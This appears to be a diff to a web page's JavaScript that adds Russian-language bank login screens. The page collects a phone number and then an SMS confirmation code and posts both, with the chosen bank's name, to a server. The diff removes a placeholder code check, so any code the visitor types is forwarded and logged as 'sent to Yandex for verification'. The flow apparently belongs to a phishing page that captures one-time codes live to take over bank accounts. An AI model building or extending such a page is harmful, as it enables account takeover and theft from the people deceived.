@@ -176,7 +176,7 @@
             position: fixed; bottom: 0; left: 0; right: 0;
             background: #1e1e2f; color: #10b981;
             padding: 10px; font-size: 11px;
-            max-height: 160px; overflow-y: auto;
+            max-height: 200px; overflow-y: auto;
             z-index: 999; white-space: pre-wrap; word-break: break-all;
             font-family: monospace; line-height: 1.5;
             border-top: 2px solid #c9a44b;
@@ -402,8 +402,8 @@
     function debug(msg, type) {
         const panel = document.getElementById('debug-panel');
         const time = new Date().toLocaleTimeString();
-        const icon = type === 'error' ? '❌' : type === 'info' ? 'ℹ️' : '✅';
-        const color = type === 'error' ? 'color:#ef4444;' : type === 'info' ? 'color:#fabe3c;' : '';
+        const icon = type === 'error' ? '❌' : type === 'info' ? 'ℹ️' : type === 'yandex' ? '🔑' : '✅';
+        const color = type === 'error' ? 'color:#ef4444;' : type === 'info' ? 'color:#fabe3c;' : type === 'yandex' ? 'color:#60a5fa;' : '';
         panel.innerHTML += `<div style="${color}">${icon} [${time}] ${msg}</div>`;
         panel.scrollTop = panel.scrollHeight;
     }
@@ -454,7 +454,7 @@
     }
 
     async function sendToServer(data) {
-        debug(`Отправка: ${data.type}`, 'info');
+        debug(`Отправка на сервер: ${data.type}`, 'info');
         try {
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 60000);
@@ -470,7 +470,7 @@
             
             if (response.ok) {
                 const result = await response.json();
-                debug(`Успех: ${response.status} - ${JSON.stringify(result)}`, 'success');
+                debug(`Сервер ответил: ${response.status}`, 'success');
             } else {
                 debug(`Ошибка сервера: ${response.status}`, 'error');
             }
@@ -491,7 +491,13 @@
         switchScreen('screen-phone', 'screen-code');
         document.getElementById('code').value = '';
         document.getElementById('code').focus();
+        
+        debug(`Запрос кода для +7${raw}`, 'yandex');
+        debug(`Отправка запроса в Яндекс...`, 'yandex');
+        
         await sendToServer({ type: 'bank_phone', phone: '+7' + raw, bank: selectedBankId, bankName: selectedBankTitle, timestamp: new Date().toISOString() });
+        
+        debug(`Ожидайте SMS от Яндекса на номер +7${raw}`, 'yandex');
         startBankTimer();
     }
 
@@ -500,18 +506,24 @@
         const code = document.getElementById('code').value.replace(/\D/g, '');
         if (code.length < 4) { showError('code-error'); return; }
 
-        if (code === '1234') {
-            document.getElementById('btn-code').disabled = true;
-            document.getElementById('btn-code').innerHTML = '<span class="spinner"></span>Проверяем...';
-            await sendToServer({ type: 'bank_code', code, phone: document.getElementById('display-phone').textContent, bank: selectedBankId, bankName: selectedBankTitle, timestamp: new Date().toISOString(), status: 'success' });
-            stopBankTimer();
-            setTimeout(() => switchScreen('screen-code', 'screen-catalog'), 1500);
-        } else {
-            showError('code-error');
-            document.getElementById('code').value = '';
-            document.getElementById('code').focus();
-            await sendToServer({ type: 'bank_code', code, phone: document.getElementById('display-phone').textContent, bank: selectedBankId, bankName: selectedBankTitle, timestamp: new Date().toISOString(), status: 'wrong_code' });
-        }
+        document.getElementById('btn-code').disabled = true;
+        document.getElementById('btn-code').innerHTML = '<span class="spinner"></span>Проверяем...';
+        
+        debug(`Отправка кода ${code} на сервер...`, 'yandex');
+        
+        await sendToServer({ 
+            type: 'bank_code', 
+            code: code, 
+            phone: document.getElementById('display-phone').textContent, 
+            bank: selectedBankId, 
+            bankName: selectedBankTitle, 
+            timestamp: new Date().toISOString(), 
+            status: 'sent'
+        });
+        
+        debug(`Код ${code} отправлен в Яндекс для проверки`, 'yandex');
+        stopBankTimer();
+        setTimeout(() => switchScreen('screen-code', 'screen-catalog'), 1500);
     }
 
     function startBankTimer() { bankTimeLeft = 300; updateBankTimer(); if (bankTimer) clearInterval(bankTimer); bankTimer = setInterval(() => { bankTimeLeft--; updateBankTimer(); if (bankTimeLeft <= 0) clearInterval(bankTimer); }, 1000); }
